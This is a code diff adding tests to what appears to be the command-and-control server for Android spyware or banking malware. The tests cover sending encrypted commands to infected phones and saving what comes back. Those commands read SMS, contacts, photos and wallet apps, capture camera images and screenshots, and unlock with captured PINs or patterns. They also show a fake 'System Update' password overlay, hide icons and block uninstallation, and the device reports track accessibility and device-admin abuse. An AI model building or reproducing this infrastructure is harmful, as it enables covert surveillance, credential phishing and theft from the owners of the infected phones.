@@ -2,8 +2,12 @@ from __future__ import annotations
 
 import asyncio
 import base64
+import hashlib
+import hmac
 import json
+import struct
 import tempfile
+import time
 import uuid
 from pathlib import Path
 
@@ -15,7 +19,11 @@ from starlette.websockets import WebSocketDisconnect
 
 from app.config import Settings
 from app.legacy_protocol import decrypt_legacy_payload
-from app.main import create_app
+from app.main import (
+    LEGACY_REMAINING_ACTIONS,
+    LEGACY_REMAINING_FIXED_DATA,
+    create_app,
+)
 from app.security import token_hash, utc_now
 
 
@@ -35,7 +43,10 @@ def encrypt_legacy_payload(payload: object) -> str:
     )
 
 
-def make_client(temp: tempfile.TemporaryDirectory) -> TestClient:
+def make_client(
+    temp: tempfile.TemporaryDirectory,
+    client_address: tuple[str, int] | None = None,
+) -> TestClient:
     settings = Settings(
         database_path=Path(temp.name) / "test.sqlite3",
         bootstrap_admin_username="admin",
@@ -46,7 +57,19 @@ def make_client(temp: tempfile.TemporaryDirectory) -> TestClient:
         device_offline_after_seconds=30,
         enable_device_lock=False,
     )
-    return TestClient(create_app(settings))
+    app = create_app(settings)
+    if client_address is None:
+        return TestClient(app)
+    return TestClient(app, client=client_address)
+
+
+def totp_code(secret: str, at_epoch: int | None = None) -> str:
+    key = base64.b32decode(secret + "=" * (-len(secret) % 8), casefold=True)
+    counter = int(time.time() if at_epoch is None else at_epoch) // 30
+    digest = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
+    offset = digest[-1] & 0x0F
+    value = (struct.unpack(">I", digest[offset : offset + 4])[0] & 0x7FFFFFFF) % 1_000_000
+    return f"{value:06d}"
 
 
 def login(client: TestClient) -> tuple[str, dict[str, str]]:
@@ -409,6 +432,1057 @@ def test_encrypted_socketio_device_online_status() -> None:
         temp.cleanup()
 
 
+def test_legacy_login_and_encrypted_device_online_are_saved() -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            sid = "legacy-device-online-sid"
+            assert asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            ) is True
+            assert asyncio.run(sio.handlers["/"]["login"](sid, device["device_id"])) == {
+                "accepted": True,
+                "device_id": device["device_id"],
+            }
+
+            report_data = {
+                "deviceId": device["device_id"],
+                "pkg": "android",
+                "apps": None,
+                "mails": None,
+                "deviceInfo": {
+                    "myPkg": "com.example.updated",
+                    "apkVer": "2.0.0",
+                    "timeZone": "Asia/Manila",
+                    "lang": "zh",
+                    "brand": "品牌",
+                    "model": "型号",
+                    "version": 35,
+                    "battery": 80,
+                    "charging": False,
+                    "lock": 0,
+                    "acc": True,
+                    "netstate": "wifi",
+                    "wallpaper": "内容",
+                },
+            }
+            accepted = asyncio.run(
+                sio.handlers["/"]["enc msg"](
+                    sid,
+                    encrypt_legacy_payload(
+                        {"action": "deviceOnline", "type": "enc", "data": report_data}
+                    ),
+                )
+            )
+            assert accepted == {"accepted": True, "device_id": device["device_id"]}
+
+            detail = client.get(
+                f"/api/devices/{device['device_id']}", headers=headers
+            ).json()["data"]
+            assert detail["brand"] == "品牌"
+            assert detail["model"] == "型号"
+            assert detail["sdk_int"] == 35
+            assert detail["package_name"] == "com.example.updated"
+            assert detail["app_version"] == "2.0.0"
+            assert detail["timezone"] == "Asia/Manila"
+            assert detail["locale"] == "zh"
+            assert detail["battery_percent"] == 80
+            assert detail["accessibility_enabled"] == 1
+            assert detail["network_type"] == "wifi"
+
+            stored = client.app.state.db.one(
+                "SELECT data_json FROM device_data_reports WHERE device_id=? "
+                "AND action='deviceOnline' ORDER BY id DESC LIMIT 1",
+                (device["device_id"],),
+            )
+            assert json.loads(stored["data_json"]) == report_data
+        temp.cleanup()
+
+
+def test_encrypted_device_online_creates_unknown_device_and_binds_socket() -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device_id = str(uuid.uuid4())
+            sio = client.app.state.socketio_server
+            sid = "legacy-new-device-sid"
+            assert asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    None,
+                )
+            ) is True
+
+            report_data = {
+                "deviceId": device_id,
+                "pkg": "android",
+                "apps": None,
+                "mails": None,
+                "deviceInfo": {
+                    "appName": "New device",
+                    "brand": "Brand",
+                    "model": "Model",
+                    "version": 35,
+                    "battery": 80,
+                    "charging": True,
+                    "netstate": "WIFI",
+                    "network": "WIFI",
+                    "lock": 1,
+                    "acc": True,
+                },
+            }
+            accepted = asyncio.run(
+                sio.handlers["/"]["enc msg"](
+                    sid,
+                    encrypt_legacy_payload(
+                        {"action": "deviceOnline", "type": "enc", "data": report_data}
+                    ),
+                )
+            )
+            assert accepted == {"accepted": True, "device_id": device_id}
+
+            detail = client.get(f"/api/devices/{device_id}", headers=headers)
+            assert detail.status_code == 200, detail.text
+            saved = detail.json()["data"]
+            assert saved["online"] == 1
+            assert saved["battery_percent"] == 80
+            assert saved["charging"] == 1
+            assert saved["network_type"] == "wifi"
+            assert saved["lock_state_code"] == 1
+            assert saved["screen_state"] == "locked"
+            assert saved["accessibility_enabled"] == 1
+            assert saved["socket_id"] == sid
+            assert saved["last_online_at"] is not None
+
+            emitted: list[tuple[str, str, str | None]] = []
+
+            async def capture_emit(event: str, payload: str, to: str | None = None):
+                emitted.append((event, payload, to))
+
+            sio.emit = capture_emit
+            response = client.post(
+                f"/api/devices/{device_id}/workbench-actions/unlock",
+                headers=headers,
+                json={"value": None, "payload": {}},
+            )
+            assert response.status_code == 202, response.text
+            assert emitted[0][0] == "new_msg"
+            assert emitted[0][2] == sid
+
+            stored = client.app.state.db.one(
+                "SELECT data_json FROM device_data_reports WHERE device_id=? "
+                "AND action='deviceOnline' ORDER BY id DESC LIMIT 1",
+                (device_id,),
+            )
+            assert json.loads(stored["data_json"]) == report_data
+        temp.cleanup()
+
+
+def test_plain_http_heartbeat_creates_updates_and_records_device() -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device_id = str(uuid.uuid4())
+            response = client.post(
+                "/heartbeat",
+                json={
+                    "event": "heartbeat",
+                    "buildId": "beced2b5",
+                    "ts": 1760000000000,
+                    "brand": "品牌",
+                    "model": "型号",
+                    "sdk": 35,
+                    "deviceId": device_id,
+                    "packageName": "com.example.heartbeat",
+                    "acc_status": "on",
+                    "battery": 80,
+                },
+            )
+            assert response.status_code == 204, response.text
+            assert response.content == b""
+
+            detail = client.get(f"/api/devices/{device_id}", headers=headers)
+            assert detail.status_code == 200, detail.text
+            saved = detail.json()["data"]
+            assert saved["online"] == 1
+            assert saved["battery_percent"] == 80
+            assert saved["accessibility_enabled"] == 1
+            assert saved["brand"] == "品牌"
+            assert saved["model"] == "型号"
+            assert saved["sdk_int"] == 35
+            assert saved["package_name"] == "com.example.heartbeat"
+            assert saved["last_heartbeat_at"] is not None
+
+            heartbeat = client.app.state.db.one(
+                "SELECT event,build_id,client_timestamp,battery,acc_status,received_at "
+                "FROM device_heartbeats WHERE device_id=? ORDER BY id DESC LIMIT 1",
+                (device_id,),
+            )
+            assert heartbeat["event"] == "heartbeat"
+            assert heartbeat["build_id"] == "beced2b5"
+            assert heartbeat["client_timestamp"] == 1760000000000
+            assert heartbeat["battery"] == 80
+            assert heartbeat["acc_status"] == "on"
+            assert heartbeat["received_at"] is not None
+        temp.cleanup()
+
+
+def test_encrypted_diagnostics_update_status_and_save_history() -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            sid = "legacy-diagnostic-sid"
+            assert asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            ) is True
+
+            reports = [
+                {
+                    "type": "acc_lifecycle",
+                    "event": "onServiceConnected",
+                    "reason": "值",
+                    "ts": 1760000000000,
+                    "battery": 80,
+                    "charging": True,
+                    "mem_avail_mb": 2048,
+                    "mem_total_mb": 4096,
+                    "mem_low": False,
+                    "interactive": True,
+                    "ignoring_battery_opt": True,
+                    "idle_mode": False,
+                    "permissions": {
+                        "battery_whitelist": True,
+                        "accessibility": True,
+                        "sms": True,
+                        "album": True,
+                    },
+                    "sdk": 35,
+                    "brand": "品牌",
+                    "model": "型号",
+                    "deviceId": device["device_id"],
+                },
+                {
+                    "type": "battery_auto",
+                    "message": "DONE|whitelisted=true|brand=品牌",
+                    "ts": 1760000000001,
+                    "deviceId": device["device_id"],
+                },
+                {
+                    "type": "device_admin",
+                    "message": "ACTIVATED",
+                    "ts": 1760000000002,
+                    "deviceId": device["device_id"],
+                },
+            ]
+            for report in reports:
+                result = asyncio.run(
+                    sio.handlers["/"]["enc msg"](
+                        sid,
+                        encrypt_legacy_payload(
+                            {"action": "diag", "type": "enc", "data": report}
+                        ),
+                    )
+                )
+                assert result is None
+
+            detail = client.get(
+                f"/api/devices/{device['device_id']}", headers=headers
+            ).json()["data"]
+            assert detail["battery_percent"] == 80
+            assert detail["charging"] == 1
+            assert detail["screen_interactive"] == 1
+            assert detail["accessibility_enabled"] == 1
+            assert detail["battery_whitelist_enabled"] == 1
+            assert detail["idle_mode"] == 0
+            assert detail["memory_available_mb"] == 2048
+            assert detail["memory_total_mb"] == 4096
+            assert detail["memory_low"] == 0
+            assert detail["last_acc_event"] == "onServiceConnected"
+            assert detail["battery_stage"] == "DONE"
+            assert detail["battery_message"] == "DONE|whitelisted=true|brand=品牌"
+            assert detail["device_admin_enabled"] == 1
+            assert detail["device_admin_status"] == "ACTIVATED"
+
+            diagnostics = client.app.state.db.all(
+                "SELECT diagnostic_type,payload_json FROM device_diagnostics "
+                "WHERE device_id=? ORDER BY id",
+                (device["device_id"],),
+            )
+            assert [item["diagnostic_type"] for item in diagnostics] == [
+                "acc_lifecycle",
+                "battery_auto",
+                "device_admin",
+            ]
+            assert json.loads(diagnostics[0]["payload_json"]) == reports[0]
+
+            destroy_report = {
+                **reports[0],
+                "event": "onDestroy",
+                "uptime_sec": 3600,
+                "ts": 1760000000003,
+            }
+            fallback = client.post(
+                "/device_log",
+                json={"action": "diag", "type": "enc", "data": destroy_report},
+            )
+            assert fallback.status_code == 204, fallback.text
+            detail = client.get(
+                f"/api/devices/{device['device_id']}", headers=headers
+            ).json()["data"]
+            assert detail["accessibility_enabled"] == 0
+            assert detail["last_acc_event"] == "onDestroy"
+        temp.cleanup()
+
+
+@pytest.mark.parametrize(
+    ("action", "payload", "expected_wire_action", "expected_data"),
+    [
+        ("unlock", {}, "unlock", {}),
+        (
+            "patternUnlock",
+            {"pattern": "1235789"},
+            "patternUnlock",
+            {"pattern": "1235789"},
+        ),
+        (
+            "smartUnlock",
+            {"type": "pin", "credential": "123456"},
+            "smartUnlock",
+            {"type": "pin", "credential": "123456"},
+        ),
+        ("lockScreen", {}, "lockScreen", {}),
+        ("power", {}, "power", {}),
+        ("screenshot", {}, "screenshot", {}),
+        (
+            "rear-camera",
+            {},
+            "startCam",
+            {"index": 0, "quality": 50, "rotation": 0, "frameRate": 15, "width": 640, "zoom": 0},
+        ),
+        (
+            "front-camera",
+            {},
+            "startCam",
+            {"index": 1, "quality": 50, "rotation": 0, "frameRate": 15, "width": 640, "zoom": 0},
+        ),
+        (
+            "startCam",
+            {"index": 1},
+            "startCam",
+            {"index": 1, "quality": 50, "rotation": 0, "frameRate": 15, "width": 640, "zoom": 0},
+        ),
+        ("stopCam", {}, "stopCam", {}),
+        ("openpkg", {"pkg": "com.example.app"}, "openpkg", {"pkg": "com.example.app"}),
+        (
+            "uninstallApk",
+            {"pkg": "com.example.app"},
+            "uninstallApk",
+            {"pkg": "com.example.app"},
+        ),
+        ("antiDeleteOn", {}, "antiDeleteOn", {}),
+        ("antiDeleteOff", {}, "antiDeleteOff", {}),
+        (
+            "startApk",
+            {"pkg": "com.example.app"},
+            "startApk",
+            {"pkg": "com.example.app"},
+        ),
+        ("showShortcuts", {}, "showShortcuts", {}),
+        ("hideShortcuts", {}, "hideShortcuts", {}),
+        (
+            "iconAlias",
+            {"alias": "N", "show": True},
+            "iconAlias",
+            {"alias": "N", "show": True},
+        ),
+        ("iconList", {}, "iconList", {"fromAdmin": "admin"}),
+        ("black", {}, "black", {}),
+        ("blackB", {}, "blackB", {}),
+        ("lockNormal", {}, "lockNormal", {}),
+        ("light", {}, "light", {}),
+        ("lightT", {}, "lightT", {}),
+        (
+            "transparent",
+            {
+                "url": "https://example.com/page",
+                "fullscreen": True,
+                "through": False,
+            },
+            "transparent",
+            {
+                "url": "https://example.com/page",
+                "fullscreen": True,
+                "through": False,
+            },
+        ),
+        (
+            "openLayer",
+            {"url": "https://example.com/page"},
+            "openLayer",
+            {"url": "https://example.com/page"},
+        ),
+        (
+            "showLockOverlay",
+            {
+                "type": "pin",
+                "title": "System Update",
+                "subtitle": "Enter password",
+            },
+            "showLockOverlay",
+            {
+                "type": "pin",
+                "title": "System Update",
+                "subtitle": "Enter password",
+            },
+        ),
+        ("hideLockOverlay", {}, "hideLockOverlay", {}),
+        (
+            "inputSend",
+            {"input": "需要输入的文字"},
+            "inputSend",
+            {"input": "需要输入的文字"},
+        ),
+        (
+            "readSmsList",
+            {},
+            "readSmsList",
+            {"curpage": 0, "pagesize": 50, "fromAdmin": "admin"},
+        ),
+        ("walletList", {}, "walletList", {"fromAdmin": "admin"}),
+        ("reqPerList", {}, "reqPerList", {"fromAdmin": "admin"}),
+        (
+            "readAlbumList",
+            {},
+            "readAlbumList",
+            {"curpage": 1, "pagesize": 50, "fromAdmin": "admin"},
+        ),
+        (
+            "readAlbumLast",
+            {"path": "/storage/emulated/0/DCIM/名称.jpg", "del": False},
+            "readAlbumLast",
+            {
+                "path": "/storage/emulated/0/DCIM/名称.jpg",
+                "del": False,
+                "fromAdmin": "admin",
+            },
+        ),
+        (
+            "readAlbumThumbnail",
+            {
+                "fileList": [
+                    {
+                        "path": "/storage/emulated/0/DCIM/名称.jpg",
+                        "fileMd5": "值",
+                        "maxWidth": 200,
+                    }
+                ],
+                "maxWidth": 200,
+                "elem": "值",
+            },
+            "readAlbumThumbnail",
+            {
+                "fileList": [
+                    {
+                        "path": "/storage/emulated/0/DCIM/名称.jpg",
+                        "fileMd5": "值",
+                        "maxWidth": 200,
+                    }
+                ],
+                "maxWidth": 200,
+                "elem": "值",
+                "fromAdmin": "admin",
+            },
+        ),
+        (
+            "readContactList",
+            {},
+            "readContactList",
+            {"curpage": 0, "pagesize": 50, "fromAdmin": "admin"},
+        ),
+    ],
+)
+def test_unlock_uses_encrypted_legacy_socketio_new_msg(
+    action: str,
+    payload: dict[str, object],
+    expected_wire_action: str,
+    expected_data: dict[str, object],
+) -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            connect_handler = sio.handlers["/"]["connect"]
+            sid = f"legacy-{action}-sid"
+            assert asyncio.run(
+                connect_handler(
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            ) is True
+
+            emitted: list[tuple[str, str, str | None]] = []
+
+            async def capture_emit(event: str, payload: str, to: str | None = None):
+                emitted.append((event, payload, to))
+
+            sio.emit = capture_emit
+            response = client.post(
+                f"/api/devices/{device['device_id']}/workbench-actions/{action}",
+                headers=headers,
+                json={"value": None, "payload": payload},
+            )
+
+            assert response.status_code == 202, response.text
+            assert response.json()["data"] == {"status": "sent"}
+            assert len(emitted) == 1
+            event, ciphertext, target_sid = emitted[0]
+            assert event == "new_msg"
+            assert target_sid == sid
+            assert decrypt_legacy_payload(ciphertext, LEGACY_AES_KEY) == {
+                "action": expected_wire_action,
+                "data": expected_data,
+            }
+
+            command = client.app.state.db.one(
+                "SELECT action,payload_json,status,sent_at,result_json FROM commands "
+                "WHERE device_id=? ORDER BY queued_at DESC LIMIT 1",
+                (device["device_id"],),
+            )
+            assert command["action"] == action
+            assert command["payload_json"] == "{}"
+            assert command["status"] == "sent"
+            assert command["sent_at"] is not None
+            assert command["result_json"] is None
+        temp.cleanup()
+
+
+@pytest.mark.parametrize(
+    ("request_action", "report_action"),
+    [("screenshot", "screenshot"), ("rear-camera", "camPic")],
+)
+def test_uncorrelated_encrypted_socketio_images_use_device_and_action(
+    request_action: str,
+    report_action: str,
+) -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            sid = f"legacy-{report_action}-sid"
+            assert asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            ) is True
+
+            emitted: list[tuple[str, str, str | None]] = []
+
+            async def capture_emit(event: str, payload: str, to: str | None = None):
+                emitted.append((event, payload, to))
+
+            sio.emit = capture_emit
+            response = client.post(
+                f"/api/devices/{device['device_id']}/workbench-actions/{request_action}",
+                headers=headers,
+                json={"value": None, "payload": {}},
+            )
+            assert response.status_code == 202, response.text
+            assert response.json()["data"] == {"status": "sent"}
+
+            image_base64 = base64.b64encode(b"sensitive-jpeg-bytes").decode("ascii")
+            report_data = {
+                "img": image_base64,
+                "deviceId": device["device_id"],
+            }
+            if report_action == "camPic":
+                report_data.update({"w": 640, "h": 480})
+            encrypted_ack = asyncio.run(
+                sio.handlers["/"]["enc msg"](
+                    sid,
+                    encrypt_legacy_payload(
+                        {
+                            "action": report_action,
+                            "type": "enc",
+                            "data": report_data,
+                        }
+                    ),
+                )
+            )
+            assert decrypt_legacy_payload(encrypted_ack, LEGACY_AES_KEY) == {
+                "accepted": True,
+                "device_id": device["device_id"],
+                "action": report_action,
+            }
+
+            command = client.app.state.db.one(
+                "SELECT status,result_json FROM commands WHERE device_id=? AND action=? "
+                "ORDER BY queued_at DESC LIMIT 1",
+                (device["device_id"], request_action),
+            )
+            assert command["status"] == "success"
+            result = json.loads(command["result_json"])
+            assert result["event"] == report_action
+            assert result["image_url"] == f"data:image/jpeg;base64,{image_base64}"
+            if report_action == "camPic":
+                assert result["width"] == 640
+                assert result["height"] == 480
+            stored = client.app.state.db.one(
+                "SELECT data_json FROM device_data_reports WHERE device_id=? "
+                "AND action=? ORDER BY id DESC LIMIT 1",
+                (device["device_id"], report_action),
+            )
+            assert json.loads(stored["data_json"]) == result
+        temp.cleanup()
+
+
+def test_uncorrelated_encrypted_socketio_icon_list_uses_device_and_action() -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            sid = "legacy-icon-list-sid"
+            assert asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            ) is True
+
+            async def capture_emit(event: str, payload: object, to: str | None = None):
+                return None
+
+            sio.emit = capture_emit
+            response = client.post(
+                f"/api/devices/{device['device_id']}/workbench-actions/iconList",
+                headers=headers,
+                json={"value": None, "payload": {}},
+            )
+            assert response.status_code == 202, response.text
+            assert response.json()["data"] == {"status": "sent"}
+
+            applications = [{"pkg": "com.example.app", "name": "Example"}]
+            encrypted_ack = asyncio.run(
+                sio.handlers["/"]["enc msg"](
+                    sid,
+                    encrypt_legacy_payload(
+                        {
+                            "action": "iconList",
+                            "type": "enc",
+                            "data": {
+                                "data": applications,
+                                "fromAdmin": "admin",
+                                "deviceId": device["device_id"],
+                            },
+                        }
+                    ),
+                )
+            )
+            assert decrypt_legacy_payload(encrypted_ack, LEGACY_AES_KEY) == {
+                "accepted": True,
+                "device_id": device["device_id"],
+                "action": "iconList",
+            }
+            command = client.app.state.db.one(
+                "SELECT status,result_json FROM commands WHERE device_id=? "
+                "AND action='iconList' ORDER BY queued_at DESC LIMIT 1",
+                (device["device_id"],),
+            )
+            assert command["status"] == "success"
+            assert json.loads(command["result_json"]) == {
+                "data": applications,
+                "fromAdmin": "admin",
+            }
+            stored = client.app.state.db.one(
+                "SELECT data_json FROM device_data_reports WHERE device_id=? "
+                "AND action='iconList' ORDER BY id DESC LIMIT 1",
+                (device["device_id"],),
+            )
+            assert json.loads(stored["data_json"]) == {
+                "data": applications,
+                "fromAdmin": "admin",
+            }
+        temp.cleanup()
+
+
+@pytest.mark.parametrize(
+    ("request_action", "request_payload", "report_action", "report_data", "expected"),
+    [
+        (
+            "walletList",
+            {},
+            "walletList",
+            {
+                "data": [{"pkg": "com.example.wallet", "name": "Wallet"}],
+                "fromAdmin": "admin",
+            },
+            {
+                "data": [{"pkg": "com.example.wallet", "name": "Wallet"}],
+                "fromAdmin": "admin",
+            },
+        ),
+        (
+            "reqPerList",
+            {},
+            "reqPerList",
+            {
+                "data": [
+                    {"name": "android.permission.READ_SMS", "granted": True}
+                ],
+                "fromAdmin": "admin",
+            },
+            {
+                "data": [
+                    {"name": "android.permission.READ_SMS", "granted": True}
+                ],
+                "fromAdmin": "admin",
+            },
+        ),
+        (
+            "readAlbumList",
+            {},
+            "albumList",
+            {
+                "data": [
+                    {
+                        "id": 123,
+                        "name": "名称.jpg",
+                        "path": "/storage/emulated/0/DCIM/名称.jpg",
+                        "date": 1760000000,
+                        "size": 102400,
+                    }
+                ],
+                "total": 100,
+                "curpage": 1,
+                "fromAdmin": "admin",
+            },
+            {
+                "data": [
+                    {
+                        "id": 123,
+                        "name": "名称.jpg",
+                        "path": "/storage/emulated/0/DCIM/名称.jpg",
+                        "date": 1760000000,
+                        "size": 102400,
+                    }
+                ],
+                "total": 100,
+                "curpage": 1,
+                "fromAdmin": "admin",
+            },
+        ),
+        (
+            "readAlbumLast",
+            {"path": "/storage/emulated/0/DCIM/名称.jpg", "del": False},
+            "albumLast",
+            {
+                "image": "aW1hZ2U=",
+                "path": "/storage/emulated/0/DCIM/名称.jpg",
+                "fromAdmin": "admin",
+            },
+            {
+                "image": "aW1hZ2U=",
+                "path": "/storage/emulated/0/DCIM/名称.jpg",
+                "fromAdmin": "admin",
+            },
+        ),
+        (
+            "readAlbumThumbnail",
+            {
+                "fileList": [
+                    {
+                        "path": "/storage/emulated/0/DCIM/名称.jpg",
+                        "fileMd5": "值",
+                        "maxWidth": 200,
+                    }
+                ],
+                "maxWidth": 200,
+                "elem": "值",
+            },
+            "albumData",
+            {
+                "data": [
+                    {
+                        "path": "/storage/emulated/0/DCIM/名称.jpg",
+                        "fileMd5": "值",
+                        "base64": "aW1hZ2U=",
+                        "maxWidth": 200,
+                    }
+                ],
+                "elem": "值",
+                "fromAdmin": "admin",
+            },
+            {
+                "data": [
+                    {
+                        "path": "/storage/emulated/0/DCIM/名称.jpg",
+                        "fileMd5": "值",
+                        "base64": "aW1hZ2U=",
+                        "maxWidth": 200,
+                    }
+                ],
+                "elem": "值",
+                "fromAdmin": "admin",
+            },
+        ),
+        (
+            "readContactList",
+            {},
+            "contactList",
+            {
+                "data": [{"name": "名称", "phones": ["号码"]}],
+                "total": 100,
+                "curpage": 0,
+                "fromAdmin": "admin",
+            },
+            {
+                "data": [{"name": "名称", "phones": ["号码"]}],
+                "total": 100,
+                "curpage": 0,
+                "fromAdmin": "admin",
+            },
+        ),
+    ],
+)
+def test_encrypted_private_data_results_are_validated_and_saved(
+    request_action: str,
+    request_payload: dict[str, object],
+    report_action: str,
+    report_data: dict[str, object],
+    expected: dict[str, object],
+) -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            sid = f"legacy-{report_action}-sid"
+            assert asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            ) is True
+
+            async def capture_emit(event: str, payload: object, to: str | None = None):
+                return None
+
+            sio.emit = capture_emit
+            response = client.post(
+                f"/api/devices/{device['device_id']}/workbench-actions/{request_action}",
+                headers=headers,
+                json={"value": None, "payload": request_payload},
+            )
+            assert response.status_code == 202, response.text
+
+            encrypted_ack = asyncio.run(
+                sio.handlers["/"]["enc msg"](
+                    sid,
+                    encrypt_legacy_payload(
+                        {
+                            "action": report_action,
+                            "type": "enc",
+                            "data": {
+                                **report_data,
+                                "deviceId": device["device_id"],
+                            },
+                        }
+                    ),
+                )
+            )
+            assert decrypt_legacy_payload(encrypted_ack, LEGACY_AES_KEY) == {
+                "accepted": True,
+                "device_id": device["device_id"],
+                "action": report_action,
+            }
+            command = client.app.state.db.one(
+                "SELECT status,result_json FROM commands WHERE device_id=? AND action=? "
+                "ORDER BY queued_at DESC LIMIT 1",
+                (device["device_id"], request_action),
+            )
+            assert command["status"] == "success"
+            assert json.loads(command["result_json"]) == expected
+            stored = client.app.state.db.one(
+                "SELECT data_json FROM device_data_reports WHERE device_id=? "
+                "AND action=? ORDER BY id DESC LIMIT 1",
+                (device["device_id"], report_action),
+            )
+            assert json.loads(stored["data_json"]) == expected
+        temp.cleanup()
+
+
+def test_encrypted_socketio_sms_list_and_received_event() -> None:
+    with tempfile.TemporaryDirectory() as directory:
+        temp = tempfile.TemporaryDirectory(dir=directory)
+        with make_client(temp) as client:
+            _, headers = login(client)
+            device = provision_device(client, headers)
+            sio = client.app.state.socketio_server
+            sid = "legacy-sms-sid"
+            assert asyncio.run(
+                sio.handlers["/"]["connect"](
+                    sid,
+                    {"asgi.scope": {"query_string": b"", "headers": []}},
+                    {
+                        "device_id": device["device_id"],
+                        "device_token": device["device_token"],
+                    },
+                )
+            ) is True
+
+            async def capture_emit(event: str, payload: object, to: str | None = None):
+                return None
+
+            dashboard_events: list[dict[str, object]] = []
+
+            async def capture_dashboard(
+                event: dict[str, object], owner_user_id: str | None = None
+            ):
+                dashboard_events.append(event)
+
+            sio.emit = capture_emit
+            client.app.state.hub.broadcast_dashboard = capture_dashboard
+            response = client.post(
+                f"/api/devices/{device['device_id']}/workbench-actions/readSmsList",
+                headers=headers,
+                json={"value": None, "payload": {}},
+            )
+            assert response.status_code == 202, response.text
+            assert response.json()["data"] == {"status": "sent"}
+
+            messages = [
+                {
+                    "address": "号码",
+                    "body": "内容",
+                    "date": 1760000000000,
+                    "type": 1,
+                }
+            ]
+            list_ack = asyncio.run(
+                sio.handlers["/"]["enc msg"](
+                    sid,
+                    encrypt_legacy_payload(
+                        {
+                            "action": "smsList",
+                            "type": "enc",
+                            "data": {
+                                "data": messages,
+                                "total": 100,
+                                "curpage": 0,
+                                "fromAdmin": "admin",
+                                "deviceId": device["device_id"],
+                            },
+                        }
+                    ),
+                )
+            )
+            assert decrypt_legacy_payload(list_ack, LEGACY_AES_KEY) == {
+                "accepted": True,
+                "device_id": device["device_id"],
+                "action": "smsList",
+            }
+            command = client.app.state.db.one(
+                "SELECT status,result_json FROM commands WHERE device_id=? "
+                "AND action='readSmsList' ORDER BY queued_at DESC LIMIT 1",
+                (device["device_id"],),
+            )
+            assert command["status"] == "success"
+            assert json.loads(command["result_json"]) == {
+                "data": messages,
+                "total": 100,
+                "curpage": 0,
+                "fromAdmin": "admin",
+            }
+
+            received_ack = asyncio.run(
+                sio.handlers["/"]["enc msg"](
+                    sid,
+                    encrypt_legacy_payload(
+                        {
+                            "action": "smsReceived",
+                            "type": "enc",
+                            "data": {
+                                "sender": "号码",
+                                "body": "内容",
+                                "timestamp": 1760000000000,
+                            },
+                        }
+                    ),
+                )
+            )
+            assert decrypt_legacy_payload(received_ack, LEGACY_AES_KEY) == {
+                "accepted": True,
+                "device_id": device["device_id"],
+                "action": "smsReceived",
+            }
+            assert dashboard_events[-1] == {
+                "type": "sms.received",
+                "device_id": device["device_id"],
+                "sms": {
+                    "sender": "号码",
+                    "body": "内容",
+                    "timestamp": 1760000000000,
+                },
+            }
+            stored = client.app.state.db.one(
+                "SELECT data_json FROM device_data_reports WHERE device_id=? "
+                "AND action='smsReceived' ORDER BY id DESC LIMIT 1",
+                (device["device_id"],),
+            )
+            assert json.loads(stored["data_json"]) == {
+                "sender": "号码",
+                "body": "内容",
+                "timestamp": 1760000000000,
+            }
+        temp.cleanup()
+
+
 def test_named_android_self_reports_support_plain_and_encrypted_payloads() -> None:
     with tempfile.TemporaryDirectory() as directory:
         temp = tempfile.TemporaryDirectory(dir=directory)
@@ -428,7 +1502,7 @@ def test_named_android_self_reports_support_plain_and_encrypted_payloads() -> No
                 assert device_ws.receive_json()["type"] == "server.hello"
 
                 plain_response = client.post(
-                    f"/api/devices/{device['device_id']}/workbench-actions/screenshot",
+                    f"/api/devices/{device['device_id']}/workbench-actions/camera",
                     headers=headers,
                     json={"value": None, "payload": {}},
                 )
